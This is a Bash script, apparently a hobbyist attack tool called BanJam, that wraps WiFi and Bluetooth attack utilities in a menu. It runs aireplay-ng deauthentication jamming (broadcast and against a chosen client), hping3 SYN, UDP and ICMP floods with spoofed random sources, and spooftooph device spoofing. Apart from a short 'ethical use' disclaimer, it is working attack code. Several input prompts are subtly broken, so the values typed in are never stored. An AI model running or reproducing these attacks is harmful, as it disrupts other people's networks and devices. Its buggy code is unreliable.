#!/bin/bash

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
ORANGE='\033[38;5;208m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "$BLUE                                                              $NC     __              "
echo -e "$BLUE  ____                              _                         $NC    /\/\             "
echo -e "$BLUE | __ |  __ _ _ ___                | | __ _ _ ____ ___    $RED  /  / $NC |/\| $RED  \  \  "
echo -e "$BLUE |  _ \ / _' | '__  \  ____    _   | |/ _' | '__  '__  \  $RED |  |  $NC |\/|  $RED  |  |'"
echo -e "$BLUE | |_) | (_| | |  | | |____|  | |__| | (_| | |  | |  | |  $RED \  \ $NC /\/\/\ $RED /  /  "
echo -e "$BLUE |____/ \__,_|_|  |_|          \_____/\__,_|_|  |_|  |_|    $NC    /_/  \_\           "

sleep 1
echo
echo -e "$YELLOW[REMINDER]: Please make sure to configure your Wireless/BLE Interface before running BanJam Attacks. $NC"
echo -e "You can configure your interfaces using the config menu under$RED WiFi/BLE Configuration $NC"
sleep 2
echo
echo -e "$YELLOW[REMINDER]: Make sure your Subprocesses are installed before starting any attacks. $NC"
echo -e "You can check and install the required subprocesses under the$RED Update Subprocesses$NC section."
sleep 2
echo
echo -e "$NC Loading BanJam... Please Select from the Menu Below."
sleep 1

config_menu() {
    while true; do
        echo
        echo -e "$NC[--- WiFi/BLE Configuration Menu ---]"
        echo "1) Configure WiFi Interface"
        echo "2) Configure BLE Interface"
        echo "99) Exit To Main Menu"
        read -p "Set>" configchoice

        case $configchoice in
            1) WiFiConfig ;;
            2) BLEConfig ;;
            99) break ;;
            *) echo "$RED Invalid Option $NC" ;;
        esac
    done
}
# Selecting an interface (setup monitering mode airmon-ng)
WiFiConfig() {
    echo
    echo -e "$GREEN [ WiFi Interfaces Found ]$NC"
    echo
    printIface=$(ip a)
    echo -e "$NC $printIface"
    echo
    echo "$NC Select Your Interface:"
    read -p "Set>" $Iface
    echo
    echo -e "$YELLOW Setting Wifi Interface to Monitering Mode...$NC"
    sudo airmon-ng check kill $Iface
    sleep 1
    sudo airmon-ng start $Iface
}
BLEConfig() {
    echo
    echo -e "$GREEN [ Bluetooth Interfaces Found ]$NC"
    echo
    printIface=$(hciconfig -a)
    echo -e "$NC $printIface"
    echo
    echo "$NC Select Your Interface:"
    read -p "Set>" $Iface
    echo
    echo -e "$YELLOW Setting BLE Interface to Monitering Mode...$NC"
    sudo hciconfig $Iface down
    sleep 1
    sudo hciconfig $Iface up
}

#Subprocess Import and Checker

subprocess_check() {

echo ""
echo "====[WELCOME TO BANJAM SUBPROCESS IMPORT & CHECKER]===="
echo
sleep 2
echo
echo "Finding Supported Package Manager..."
echo

#Checks package manager
detect_pm() {
if command -v apt >/dev/null 2>&1; then echo apt
elif command -v dnf >/dev/null 2>&1; then echo dnf
elif command -v yum >/dev/null 2>&1; then echo yum
elif command -v pacman >/dev/null 2>&1; then echo pacman
elif command -v zypper >/dev/null 2>&1; then echo zypper
elif command -v apk >/dev/null 2>&1; then echo apk
elif command -v brew >/dev/null 2>&1; then echo brew
else echo ""
fi
}

PM=$(detect_pm)
if [ -n "$PM" ]; then
echo -e "Detected Package Manager:$GREEN $PM $NC"
echo
else
echo -e "$RED No supported package manager detected. $NC"
echo
fi
sleep 1

install_tool() {
local tool=$1

case "$PM" in
   apt) sudo apt update && sudo apt install -y "$tool" ;;
   dnf) sudo dnf install -y "$tool" ;;
   yum) sudo yum install -y "$tool" ;;
   pacman) sudo pacman -Sy --noconfirm "$tool" ;;
   zypper) sudo zypper install -y "$tool" ;;
   apk) sudo apk add "$tool" ;;
   brew) brew install "$tool" ;;
   *)
   echo -e "$RED No supported package manager detected.$NC"
   echo "Install $tool manually (e.g. from your distro's repos or the project's site)."
   return 1
   ;;
esac
sleep 1
return 0
}

#Checks to see if the tools are installed and working
checktool() {
local tool=$1

if [ -n "$PM" ]; then
   echo "Checking for $tool..."
   sleep 1

   if ! command -v "$tool" > /dev/null 2>&1; then
      echo -e "$tool $RED [NOT INSTALLED]$NC"
      read -p "Would you like to install $tool now? (y/n): " install_choice
      install_choice=$(echo "$install_choice" | xargs)

      if [[ "$install_choice" =~ ^[Yy](es)?$ ]]; then
         if ! install_tool "$tool"; then
            echo -e "$ORANGE Installation Failed or unsupported. Please install $tool manually. $NC"
         fi
      else
         echo -e "$NC Skipping installation of $tool"
      fi
   else
      if "$tool" --help > /dev/null 2>&1; then
	      echo -e "$tool $GREEN [PROPERLY INSTALLED]$NC"
      else
	      echo -e "$ORANGE Warning: $tool [INSTALLED, BUT NOT WORKING PROPERLY] $NC"
      fi
   fi
else
   echo -e "$ORANGE No supported package manager detected. Please install $tool manually. $NC"
   echo
fi

}

# adding tools here
checktool airmon-ng
checktool airodump-ng
checktool aircrack-ng
checktool hping3
checktool hciconfig
checktool hcitool
checktool sdptool
checktool spooftooph
checktool btscanner
checktool fastfetch #this one is in here just to check my subprocess logic (This is not needed within the actual script)

echo
echo -e "$GREEN====[SUBPROCESS CHECK COMPLETED]====$NC"
read -n 1 -s -r -p $'Press any Key to Return To Main Menu...'

sleep 2
}

# Menu Selects

wifisub_menu() {

while true; do
    echo
    echo
    echo -e "$NC[--- Wifi Jammer Type Menu ---]"
    echo "1) Deauth Jammer Attack (Broadcast)"
    echo "2) Targeted Deauth Jammer Attack"
    echo "3) DOS Bandwidth Jammer Attack"
    echo "99) Exit To Main Menu"
    read -p "Set>" wifichoice

case $wifichoice in
      1) echo ">> Preparing Wifi $RED Attack $NC Config..."
      sleep 1
      echo
      echo "What is Your Target BSSID: "
      sleep 1
      read -p "Set>" $BSSID0
      echo
      echo "Launching Attack"
      echo
      sleep 1
      aireplay-ng --deauth 0 -b $BSSID0 $Iface;;
      2) echo ">> Preparing Targeted Deauth Jammer Attack Config..."
      echo
      sleep 1
      echo "What is Your Tareted BSSID: "
      read -p "Set>" $BSSID1 $Iface
      echo
      sleep 1
      echo "What is Your Targeted MAC Address: "
      read -p "Set>" $MAC
      echo
      echo "Launching Attack"
      echo
      sleep 1
      aireplay-ng --deauth 0 -b $BSSID1 -c $MAC $Iface;;
      3) echo ">> Preparing DOS Bandwidth Jammer Attack Config..."
      echo
      sleep 1
      echo "What is your Target IP:"
      read -p "Set>" $TARGETIP
      sleep 1
      echo
      echo "which port would you like to target?"
      read -p "Set>" $PORT
      sleep 1
      echo
      echo "What is your Target Port:"
      sleep 1
      echo
      echo "How many packets would you like to send? (number only)"
      read -p "Set>" $PACKETS
      sleep 1
      echo
      echo "what type of packets would you like to send?"
      echo -e "$NC Packet Types:"
      echo "1) TCP"
      echo "2) UDP"
      echo "3) ICMP"
      read -p "Set>" $PACKETTYPE
      case $PACKETTYPE in
         1) hping3 -c $PACKETS -v -p $PORT --flood --rand-source -S $TARGETIP;;
         2) hping3 -c $PACKETS -v -p $PORT --flood --rand-source -U $TARGETIP;;
         3) hping3 -c $PACKETS -v -p $PORT --flood --rand-source -I $TARGETIP;;
         *) echo ">> Invalid packet type" ;;
      esac;;      
      99) echo "Exiting to Main Menu..."
      break;;
      *) echo ">> Invalid Selection";;
   esac
read -n 1 -s -r -p $'\nPress Any Key to Return to Main Menu'
done
}

#BLE Attack Menu
blesub_menu() {
   while true; do
    echo
    echo
    echo -e "$NC[--- Bluetooth Low Energy (BLE) Attack Menu ---]"
    echo "1) Bluetooth Scanner (GUI Based)"
    echo "2) SpoofTooph (Bluetooth Spoofing)"
    echo "99) Exit To Main Menu"
    read -p "Set>" blechoice
      case $blechoice in
         1) echo -e ">> Preparing$RED BTScanner$NC..."
         sleep 1
         echo -e "$YELLOW[REMINDER]: In order to get back into this menu you will need to exit out of the Btscanner application. Do not close the terminal window."
         sleep 3
         btscanner &
         PID=$!
         sleep 1
         wait $PID;;
         2) echo ">> Preparing SpoofTooph (Bluetooth Spoofing) Configuration..."
         echo "What is Your Target MAC Address eg (00:11:22:33:44:55):  "
         read -p "Set>" $MAC
         echo
         echo "What Do you want the name of your spoofed device to be called?"
         read -p "Set>" $SPOOFEDNAME
         echo
         echo -e "Launching$RED Attack...$NC"
         echo
         sleep 1
         spooftooph -a $MAC -n $SPOOFEDNAME;;
         99) echo "Exiting to Main Menu..."
         break;;
         *) echo "$RED >>> Invalid Selection$NC";;
      esac
read -n 1 -s -r -p $'\nPress Any Key to Return to Main Menu'
done
}

#MAIN PROCESS and Main Menu

while true; do
   echo
   echo
   echo "[--- Main Selection Menu ---]"
   echo "1) WiFi Attacks"
   echo "2) Bluetooth Low Energy (BLE)"
   echo "3) WiFi/BLE Configuration"
   echo "4) Update Subproccesses"
   echo "5) Credits and About"
   echo "99) Exit BanJam"
   echo ""
   read -p "set> " choice

   case "$choice" in
        1) echo ">> Launching Wifi Jammer Attack Cofig Menu..."
	      sleep 1
	      clear
	      wifisub_menu;;
        2) echo ">> Launching BLE Jammer Attack Menu..."
        sleep 1
        clear
        blesub_menu;;
        3) echo ">> Launching Config Menu..."
        sleep 1
        clear
        config_menu;;
        4) echo ">> Checking Subprocesseses for BanJam..."
        sleep 2
        subprocess_check
	     sleep 3;;
        5) echo -e "$BLUE >> Loading Credits...$NC"
	sleep 2
	echo
        echo -e "Concept & Development Designed, scripted, and endlessly refined by $BLUE[IdontByte :0 ]$NC"
        echo
	sleep 2
        echo -e "Made with a deep passion for$BLUE Cybersecurity,$RED Wifi Penntesting,$GREEN Ethical Hacking,$YELLOW Coding (Its more like a love hate relationship)$NC and just a touch of creativity."
        echo
	sleep 2
echo -e "$GREEN Toolchain Integration "
sleep 1
echo "- Aireplay-ng"
sleep 1
echo "- Airmon-ng & Airodump-ng"
sleep 1
echo "- Shell scripting (Bash)"
sleep 1
echo "- Linux CLI utilities"
sleep 1
echo "- hciconfig & hcitool & spitool"
sleep 1
sleep 1
echo -e "- SpoofTooph & BTScanner$NC"
echo -e "A hint of $RED AI $NC for troubleshooting..."
sleep 1
echo -e "$YELLOW And Last But Not Least... $NC (DRUMROLL PLEASE)..."
sleep 3
echo -e "$RED - My Last Strand of Sanity $NC :0"
echo
sleep 2
echo "BanJam's menu aesthetics, ASCII layout, and terminal presence are inspired by retro hacking culture and the design spirit of tools like SEToolKit and also Airgeddon"
echo
sleep 2
echo -e "$ORANGE DISCLAIMER: This tools is used for $RED ETHICAL $ORANGE and $RED EDUCATIONAL $ORANGE purposes only. Please use this tool ethically and on your own equipend. I hope you enjoy :)$NC"
sleep 2
echo
echo -e "$BLUE Feel Free to Check out some of my other projects as Well :). My Github is $NC Nickheerkens04."
sleep 2

echo -e "$GREEN I Will Catch U Guys Later... Peace $NC"
sleep 2

echo '                 ..zeeeeeee..                 '
echo '            .zd$$$$$$$$$$$$$$$$be.            '
echo '         .e$$$$$$$$$$$$$$$$$$$$$$$$e.         '
echo '       .$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$c       '
echo '    .$$$$$$$$$$*   $$$$$$   *$$$$$$$$$$.      '
echo '   z$$$$$$$$!!     $$$$$$       $$$$$$$$$     '
echo '  d$$$$$$$!        $$$$$$        $$$$$$$$$    '
echo ' d$$$$$$!          $$$$$$          $$$$$$$$   '
echo 'd$$$$$$!           $$$$$$           ^$$$$$$b  '
echo '$$$$$$F            $$$$$$            .$$$$$$r '
echo '$$$$$$             $$$$$$.            $$$$$$$ '
echo '$$$$$F           .$$$$$$$$c           4$$$$$$ '
echo '$$$$$F          e$$$$$$$$$$$.          $$$$$$ '
echo '$$$$$F        .$$$$$$$$$$$$$$b        .$$$$$$ '
echo '$$$$$b       e$$$$$$$$$$$$$$$$$c      4$$$$$$ '
echo '$$$$$$     .$$$$$$P$$$$$$$$$$$$$b.    $$$$$$P '
echo '$$$$$$b   d$$$$$$! $$$$$$ !$$$$$$$c  d$$$$$$. '
echo '.$$$$$$b.$$$$$$P   $$$$$$  ^*$$$$$$bd$$$$$$F  '
echo ' !$$$$$$$$$$$$!    $$$$$$    !$$$$$$$$$$$$P   '
echo '  !$$$$$$$$$P      $$$$$$      *$$$$$$$$$!    '
echo '   ^$$$$$$$$$e.    $$$$$$    .e$$$$$$$$$!     '
echo '     !$$$$$$$$$$$ee$$$$$$ee$$$$$$$$$$$*       '
echo '       !$$$$$$$$$$$$$$$$$$$$$$$$$$$$!         '
echo '          !*$$$$$$$$$$$$$$$$$$$$$$*           '
echo '             ^!*$$$$$$$$$$$$$$*!!             '
echo '                 ^^^^^^^^^^^^                 '
echo;;

      99) echo -e "$NC Exiting, Thank You for Using BanJam..."
      sleep 1
      sudo airmon-ng stop $Iface
      sudo systemctl start NetworkManager; break;;
      *) echo -e "$RED >> Invalid selection. Try again. $NC" ;;
    esac
   read -n 1 -s -r -p $'\nPress any key to return to menu...'
done


